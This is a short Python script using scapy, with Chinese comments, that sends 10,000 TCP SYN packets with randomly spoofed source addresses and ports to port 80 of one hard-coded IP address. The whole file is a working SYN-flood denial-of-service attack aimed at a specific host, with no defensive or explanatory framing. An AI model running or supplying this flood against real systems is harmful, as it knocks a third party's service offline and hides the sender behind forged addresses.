import random

from scapy.all import *
from scapy.layers.inet import IP, TCP
from tqdm import tqdm

for i in tqdm(range(10000)):
    # 构造随机的源IP
    src = "%i.%i.%i.%i" % (
        random.randint(1, 255),
        random.randint(1, 255),
        random.randint(1, 255),
        random.randint(1, 255),
    )
    # 构造随机的端口
    sport = random.randint(1024, 65535)
    IPlayer = IP(src=src, dst="212.103.62.219")
    TCPlayer = TCP(sport=sport, dport=80, flags="S")
    packet = IPlayer / TCPlayer
    send(packet, verbose=False)
